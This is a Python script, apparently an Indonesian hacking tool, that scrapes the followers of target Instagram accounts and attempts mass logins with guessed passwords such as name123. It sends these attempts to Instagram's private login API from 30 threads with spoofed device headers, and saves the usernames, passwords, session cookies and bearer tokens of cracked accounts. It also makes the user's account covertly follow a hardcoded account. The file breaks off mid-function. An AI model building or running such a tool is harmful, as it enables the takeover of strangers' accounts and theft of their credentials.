#!/usr/bin/env python3
# -*- coding:utf-8

# jangan di perjual belikan

#--------[ DI BUAT OLEH ZORAA DEV ]--------#
try:
    import uuid, urllib, hashlib, base64
    import os, re, sys, json, time, random, requests
    from rich.panel import Panel
    from rich.console import Console
    from rich.tree import Tree
    from rich import print as printz
    from database.useragent_instagram import Useragent
    from database.banner_terminal import Terminal
    from concurrent.futures import ThreadPoolExecutor
except(Exception, KeyboardInterrupt) as e:
    try:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6283140199711?text=INSTAGRAM%20ERROR%20%3A%20{quote(str(e))}')
        exit()
    except(Exception, KeyboardInterrupt) as e:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6283140199711?text=INSTAGRAM%20ERROR%20%3A%20{quote(str(e))}')
        exit()

dump = []

class Require:
    def __init__(self) -> None:
        pass      
        
    def Kalender(self):
        struct_time = time.localtime(time.time())
        hari_indonesia = ['senin','selasa','rabu','kamis','jumat','sabtu','minggu']
        hari = hari_indonesia[struct_time.tm_wday]
        tanggal = time.strftime('%d', struct_time)
        bulan = time.strftime('%B', struct_time)
        tahun = time.strftime('%Y', struct_time)
        jam = time.strftime('%H:%M:%S', struct_time)
        return (hari, tanggal, bulan, tahun, jam)
        
    def Convert_Username(self, username, cookies):
        with requests.Session() as r:
            try:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'
                })
                response = r.get(f'https://www.instagram.com/{username}/', cookies={'cookie': cookies}).text
                if 'user_id' in str(response):
                    return(re.findall('"user_id":"(\d+)"', str(response))[0])
            except (Exception) as e: pass
            
    def Follow_Cok(self, cookies):
        with requests.Session() as r:
           try:
               r.headers.update({
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                    'x-csrftoken': re.search('csrftoken=(.*?);',str(cookies)).group(1)
                })
               response = r.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("48998009803"), cookies={"cookie": cookies})
           except (Exception) as e: pass
            
    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(username), headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"}).json()
               return (
                   response["data"]["user"]["edge_followed_by"]["count"], 
                   response["data"]["user"]["edge_follow"]["count"], 
                   response["data"]["user"]["edge_owner_to_timeline_media"]["count"]
               )
           except (Exception) as e: return(None,None,None)
            
class Login:
    def __init__(self) -> None:
        pass
        
    def Login_Akun_Instagram(self):
        try:
           Terminal().banner_instagram()
           Console().print('\n [bold green]01[bold white]. login from cookies instagram \n [bold green]02[bold white]. login from username and password')
           query = Console().input("\n [bold green]?[bold white] choose : ")
           if len(query) >0:
               if query == '01' or query == '1':
                   try:
                       self.Cookies_Instagram()
                   except (Exception) as e:
                       Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
                       exit()       
                       
               elif query == '02' or query == '2':
                   try:
                       Terminal().banner_instagram()
                       Console().print('\n [bold green]• [italic white]silakan masukan username and password, gunakan pemisah <=> untuk username dengan password, pastikan akun tidak chekpoint dan terpasang A2F')
                       querty = Console().input("\n [bold green]?[bold white] username and password : ")
                       if len(querty) >0:
                           try:
                               self.username = querty.split('<=>')[0]
                               self.password = querty.split('<=>')[1]
                               self.Username_And_Password(self.username,self.password)
                           except (Exception) as e:
                               Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
                               exit()   
                       else:
                           Console().print(f"\n [bold red]•[bold white] Opss, anda tidak memasukan username dan password, masukan dengan benar!")
                           exit()     
                   except (Exception) as e:
                       Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
                       exit()   
               else:
                   Console().print(f"\n [bold red]•[bold white] Opss, menu yang anda masukan tidak terdaftar!")
                   exit()      
           else:
               Console().print(f"\n [bold red]•[bold white] Opss, menu yang anda masukan tidak terdaftar!")
               exit()          
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
            exit()        
        
    def Cookies_Instagram(self):
        try:
            Terminal().banner_instagram()
            Console().print('\n [bold green]• [italic white]silakan masukan cookies instagram, pastikan akun tidak chekpoint dan terpasang A2F')
            cookies = Console().input("\n [bold green]?[bold white] cookies instagram  : ")
            if len(cookies) >0:
                self.username, self.fullname = self.Validasi_Cookies(cookies)
                with open('.cookie_instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        "Cookie": cookies,
                    }))
                    wr.close()
                Require().Follow_Cok(cookies)
                Console().print(f'\n [bold green]• [italic white]selamat datang [bold green]{self.username}/{self.fullname}[italic white], silakan jalankan ulang [bold green]python Run.py')
                exit()
            else:
                Console().print(f"\n [bold red]•[bold white] Opss, anda tidak memasukan cookies instagram!")
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
            exit()     
            
    def Username_And_Password(self, username, password):
        try:
            byps = requests.Session()
            app_instagram = {'signed_body': 'SIGNATURE'+str(json.dumps({'id': str(uuid.uuid4()), "server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_custom_transitions_universe,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_session_scoped_logger,ig_android_accoun_switch_badge_fix_universe,ig_android_smartlock_hints_universe,ig_android_black_out,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_android_direct_remove_view_mode_stickiness_universe,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"})),'ig_sig_key_version': '4'}
            response = byps.get('https://www.instagram.com/', data = app_instagram, allow_redirects=True)
            headers = {
                'Host': 'www.instagram.com',
                'vary': 'Accept-Encoding',
                'x-fb-debug':'X+2SLtmnrCBfsBDb/pVlP8IRXmPriN3g+iTxoPj6Ol2jUJz5zs8I0ghgR7yekWJhRwO06oxty5Ba+4h9P8vD2Q==',
                'content-length': str(len(("&").join([ "%s=%s" % (name, value) for name, value in app_instagram.items() ]))),
                'x-ig-app-id': '1217981644879628',
                'x-instagram-ajax': '1011794706',
                'user-agent': 'Instagram 63.0.0.17.94 Android (31/10; 360dpi; 1080x2326; Vivo; V2020CA; V1950A; qcom; id_ID; 253447817)',
                'sec-ch-ua-mobile': '?0',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'x-asbd-id': '129477',
                'dpr': '2',
                'x-csrftoken': re.search('{"csrf_token":"(.*?)"', str(response.text)).group(1),
                'x-requested-with': 'XMLHttpRequest',
                'accept': '*/*',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': '0',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/accounts/onetap/?next=%2F&hl=en',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'en-US,id-ID,id;q=0.9',
                'connection': 'close',
                'range':'bytes=0-2048'
            }
            payload = {
                'username': username,
                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),password),
                'optIntoOneTap': False,
                'queryParams': '{}',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': {}
            }
            response2 = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, allow_redirects=True).text
            if 'userId' in str(response2):
               try: cookies = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
               except (Exception) as e: cookie = (None)
               Console().print(f'\n [bold green]• [italic white]cookies instagram : [bold green]{cookies}')
               if len(cookies) >0:
                   self.username, self.fullname = self.Validasi_Cookies(cookies)
                   with open('.cookie_instagram.json', 'w') as wr:
                       wr.write(json.dumps({
                           "Cookie": cookies,
                       }))
                       wr.close()
                   Require().Follow_Cok(cookies)
                   Console().print(f'\n [bold green]• [italic white]selamat datang [bold green]{self.username}/{self.fullname}[italic white], silakan jalankan ulang [bold green]python Run.py')
                   exit()
               else:
                   Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Opss, kami tidak dapat mengakses cookie anda, perkiraan cookie [bold yellow]checkpoint[bold grey50]/[bold red]Invalid!", title = f"[bold white]• [bold red]Eror 404 [bold white]•"))
                   exit()
            elif 'two_factor_required' in str(response2):
                Console().print(f"\n [bold red]•[bold white] [italic white]Opss, kami tidak dapat mengakses akun anda, akun anda terpasang [bold red]A2F!")
                exit()
            elif 'challenge_required' in str(response2):
                Console().print(f"\n [bold red]•[bold white] [italic white]Opss, kami tidak dapat mengakses akun anda, akun anda [bold yellow]Chekpoint!")
                exit()
            elif 'ip_block' in str(response2):
                Console().print(f"\n [bold red]•[bold white] Opss, ip keblokir sipakan mode pesawat dahulu 5 detik!")
                exit()
            else:
                Console().print(f"\n [bold red]•[bold white] Opss, username atau password yang anda masukan salah!")
                exit()
        except (KeyboardInterrupt, Exception, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e:
            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
            exit()   
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.search('ds_user_id=(\d+)',str(cookies)).group(1)), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Terminal().clear_terminal_size()
                Console().print(f"\n [bold red]•[bold white] Opss, cookie anda kedaluarsa/spam silakan cek akun anda atau ganti tumbal!")
                time.sleep(3.5)
                self.Login_Akun_Instagram()
                
class Instagram:
    def __init__(self):
        self.success, self.chekpoint, self.faktor ,self.looping = 0,0,0,0
        self.Create_Mkdir()
                
    def Create_Mkdir(self):
        try: os.mkdir('/sdcard/OK')
        except: pass
        try: os.mkdir('/sdcard/2F')
        except: pass
        try: os.mkdir('/sdcard/CP')
        except: pass 
        
    def Remove_Cookies(self):
        try: os.system('rm -rf .cookie_instagram.json')
        except (Exception) as e: pass
        Login().Login_Akun_Instagram()
        
    def Simpan_Result(self):
        hari, tanggal, bulan, tahun, jam = Require().Kalender()
        self.hari_ini = (f'{hari}-{tanggal}-{bulan}-{tahun}')
        self.bulan = ['januari', 'februari', 'maret', 'april',  'mei', 'juni', 'juli','agustus', 'september', 'oktober', 'november', 'desember']
        return(f'instagram-ok-{self.hari_ini}.txt',f'instagram-2f-{self.hari_ini}.txt',f'Instagram-cp-{self.hari_ini}.txt')
        
    def Chek_Cookies(self):
        try:
            cookies = json.loads(open('.cookie_instagram.json', 'r').read())['Cookie']
            self.Menu_Instagram(cookies)          
        except (FileNotFoundError) as e:
            Terminal().clear_terminal_size()
            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
            time.sleep(3.5)
            self.Remove_Cookies()
           
    def Menu_Instagram(self, cookies):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookies)
        except (KeyError) as e:
            Terminal().clear_terminal_size()
            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
            time.sleep(3.5)
            self.Remove_Cookies()
                        
        except (requests.exceptions.ConnectionError) as e:
            Terminal().clear_terminal_size()
            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
            time.sleep(3.5)
            sys.exit()
        try:                     
            Terminal().banner_instagram()
            Console().print(f'\n [bold green]•[bold white] Username : [bold green]{self.username} \n [bold green]•[bold white] Fullname : [bold green]{self.fullname}')
        except (AttributeError) as e:
            Terminal().clear_terminal_size()
            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
            exit()
        Console().print('\n [bold green]01[bold white]. dump followers or followings\n [bold green]02[bold white]. upgrade script ke premium\n  [bold red]E[bold white]. keluar dari tools')
        query = Console().input("\n [bold green]?[bold white] choose : ")
        if query == '01' or query == '1':
            try:
                Console().print(f'\n [bold green]•[bold white] silahkan masukan type dump, ketik followers untuk dump dari followers dan ketik following untuk dump dari following, ketik dengan benar jangan sampai salah!')
                type_dump = Console().input("\n [bold green]?[bold white] type dump : ")
                Console().print(f'\n [bold green]•[bold white] silahkan masukan username akun instagram target pastikan tidak terkunci dan centang biru, anda juga bisa menggunakan koma untuk dump masal, misalnya : zoraa_dev01, zoraa_dev02, zoraa_dev03 dan gunakan [italic red]ctrl + c[italic white] untuk berhenti!')
                username = Console().input("\n [bold green]?[bold white] username : ")
                for self.username in username.split(','):
                    id_target = Require().Convert_Username(self.username, cookies)
                try: self.Dump_Instagram(id_target, type_dump, cookies, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console().print(f"\n [bold red]•[bold white] jumlah yang anda dump terlalu sedikit anda harus mencari target lain dan pastikan target yang terkumpul lebih dari 50 username!")
                    exit()
                else:
                    Console().print(f"\n [bold green]•[bold white] dump {type_dump} : [bold green]{str(len(dump))}!")
                    self.Methode()
            except (Exception) as e:
                Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
                exit()
                
        elif query == '02' or query == '2':
            try: os.system(f'xdg-open https://wa.me/+6283140199711?text=assalamualaikum%20bang%20Zoraa%20Dev,%20mau%20upgrade%20ke%20premium%20dong'); exit()
            except (Exception) as e:
                Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
                exit()
                
        elif query == 'e' or query == 'E':
            try: self.Remove_Cookies()
            except (Exception) as e:
                Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
                exit()
        else:
            Console().print(f"\n [bold red]•[bold white] Opss, menu yang anda masukan tidak terdaftar!")
            exit()
            
    def Dump_Instagram(self, username, type_dump, cookies, cursor):
        with requests.Session() as r:
            try:
                response = r.get('https://i.instagram.com/api/v1/friendships/{}/{}/?count=100&max_id={}'.format(username,type_dump,cursor), headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)","cookie": cookies}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f" [bold green]•[bold white] dump [bold green]@{str(akun['username'])[:20]}[bold white]/[bold blue]{str(len(dump))} [bold white]username {type_dump}     ", end='\r')
                if "next_max_id" in str(response):
                    self.Dump_Instagram(username, type_dump, cookies, response["next_max_id"])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass 
            
    def Methode(self):
        try:
            Console().print('\n [bold green]01[bold white]. login from private api [bold blue]threads\n [bold green]02[bold white]. login from private api [bold blue]smartlock')
            Method = Console().input("\n [bold green]?[bold white] choose : ")
            self.Exec_Method(Method)
        except (Exception) as e:
            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
            exit()                     
            
    def Exec_Method(self, Method):
        self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
        Console().print(f'\n [bold green]•[bold white] Result Ok : internal/OK/{self.result_ok}\n [bold green]•[bold white] Result Cp : internal/Cp/{self.result_cp}\n [bold green]•[bold white] Result 2f : internal/2f/{self.result_two}')
        Console().print(f'\n [bold green]•[bold white] Mainkan mode pesawat setiap 200 loop!\n')
        with ThreadPoolExecutor(max_workers=30) as V:
            for Username_And_Fullname in dump:
                username, fullname = Username_And_Fullname.split('<=>')
                password = []
                for nama in username.split(' '):
                    if len(nama) < 3:
                        continue
                    else:
                        for passwords in [f'{nama}123', f'{nama}1234', f'{nama}12345', f'{nama}123456']:
                             if len(passwords) < 6 or str(passwords).isalnum() == False or len(username.split(' ')) > 5:
                                continue
                             else:
                                password.append(f'{str(passwords).lower()}')
                for passwords in [f'{username}', f'{username.replace(" ", "")}']:
                    if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                        continue
                    else:
                        password.append(f'{str(passwords).lower()}')
                if Method in ('1') or Method in ('01'):
                    V.submit( self.Exec_Threads, username, password)
                elif Method in ('2') or Method in ('02'):
                    V.submit(self.Exec_Smartlock, username, password)
                else: V.submit(self.Exec_Threads, username, password)
        Console().print(f'\n [bold green]#[bold white] Response selesai\n\n [bold green]-[bold white] Result Ok : [bold green]{self.success}\n [bold green]-[bold white] Result Cp : [bold yellow]{self.chekpoint}\n [bold green]•[bold white] Result 2f : [bold red]{self.faktor}\n\n [bold white] - Thanks To Zoraa Dev -')
        
    def Exec_Threads(self, username, password):
        byps = requests.Session()
        Console().print(f" [bold purple]• [bold white]threads [bold green]{str(username)[:15]} [bold white][{str(len(dump))}/{self.looping}] - Ok/[bold green]{self.success}[bold white] - 2f/[bold red]{self.faktor}[bold white] - Cp/[bold yellow]{self.chekpoint}[bold white]]     ", end='\r')
        useragent = Useragent().useragent_instagram()
        for passwd in password:
            try:
                self.hash = hashlib.md5()
                self.hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                self.hex = self.hash.hexdigest()
                self.hash.update(self.hex.encode('utf-8') + '12345'.encode('utf-8')) 
                headers = {
                    'host': 'i.instagram.com',
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
                    'x-ig-www-claim': '0',
                    'x-bloks-is-prism-enabled': 'false',
                    'x-bloks-is-layout-rtl': 'false',
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-family-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': f'android-{self.hash.hexdigest()[:16]}',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': '3brTv10=',
                    'priority': 'u=3',
                    'user-agent': useragent,
                    'accept-language': 'id-ID, en-US',
                    'x-mid': '',
                    'ig-intended-user-id': '0',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                    'x-ig-app-id': '3419628305025917',
                    'x-pigeon-rawclienttime': str(round(time.time(), 3)),
                    'connection': 'keep-alive'
                }
                encode = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(time.time)[:10]}%3A{urllib.request.quote(str(passwd))}%22%2C%22family_device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{{str(uuid.uuid4())}}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49')
                headers.update({'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])})
                response = byps.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, headers = headers, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try:
                        self.ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1)
                        self.decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(self.ig_set_autorization.split('Bearer IGT:2:')[1]))
                    except (Exception) as e: pass
                    try:
                        cookies = (';'.join(['%s=%s'%(name, value) for name, value in self.decode_ig_set_authorization.items()]))
                    except (Exception) as e: cookies = ('cookies tidak di temukan')
                    try: follower, followed, feedpost = Require().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r[italic green]Success logged    ')
                    tree.add(f'[italic white]Username : [italic green]{username}')
                    tree.add(f'[italic white]Password : [italic green]{passwd}')
                    tree.add(f'[italic white]Profile Acc : [italic green]{follower}[bold white]/[italic green]{followed}[bold white]/[italic green]{feedpost}')
                    true = tree.add('[italic green]Response Cookies')
                    true.add(f'[italic white]Cookies : [italic green]{cookies}')
                    true.add(f'[italic white]Bearers : [italic green]{self.ig_set_autorization}')
                    tree.add(f'[italic white]Useragent : [italic green]{headers["user-agent"]}')
                    printz(tree)
                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookies}|{self.ig_set_autorization}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break          
                elif 'two_factor_required' in str(response):
                    try: follower, followed, feedpost = Require().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r[italic red]logged 2FA    ')
                    tree.add(f'[italic white]Username : [italic red]{username}')
                    tree.add(f'[italic white]Password : [italic red]{passwd}')
                    tree.add(f'[italic white]Profile Acc : [italic red]{follower}[bold white]/[italic red]{followed}[bold white]/[italic yellow]{feedpost}')
                    tree.add(f'[italic white]Useragent : [italic red]{headers["user-agent"]}')
                    printz(tree)
                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'challenge_required' in str(response):
                    try: follower, followed, feedpost = Require().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r[italic yellow]logged chekpoint    ')
                    tree.add(f'[italic white]Username : [italic yellow]{username}')
                    tree.add(f'[italic white]Password : [italic yellow]{passwd}')
                    tree.add(f'[italic white]Profile Acc : [italic yellow]{follower}[bold white]/[italic yellow]{followed}[bold white]/[italic yellow]{feedpost}')
                    tree.add(f'[italic white]Useragent : [italic yellow]{headers["user-agent"]}')
                    printz(tree)
                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                time.sleep(31)
        self.looping+=1
        
    def Exec_Smartlock(self, username, password):
        byps = requests.Session()
        Console().print(f" [bold purple]• [bold white]threads [bold green]{str(username)[:15]} [bold white][{str(len(dump))}/{self.looping}] - Ok/[bold green]{self.success}[bold white] - 2f/[bold red]{self.faktor}[bold white] - Cp/[bold yellow]{self.chekpoint}[bold white]]     ", end='\r')
        useragent = Useragent().useragent_instagram()
        for passwd in password:
            try:
                self.hash = hashlib.md5()
                self.hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                self.hex = self.hash.hexdigest()
                self.hash.update(self.hex.encode('utf-8') + '12345'.encode('utf-8')) 
                headers = {
                    'host': 'i.instagram.com',
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
                    'x-ig-www-claim': '0',
                    'x-bloks-is-prism-enabled': 'false',
                    'x-bloks-is-layout-rtl': 'false',
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-family-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': f'android-{self.hash.hexdigest()[:16]}',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': '3brTv10=',
                    'priority': 'u=3',
                    'user-agent': useragent,
                    'accept-language': 'id-ID, en-US',
                    'x-mid': '',
                    'ig-intended-user-id': '0',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                    'x-ig-app-id': '3419628305025917',
                    'x-pigeon-rawclienttime': str(round(time.time(), 3)),
                    'connection': 'keep-alive'
                }
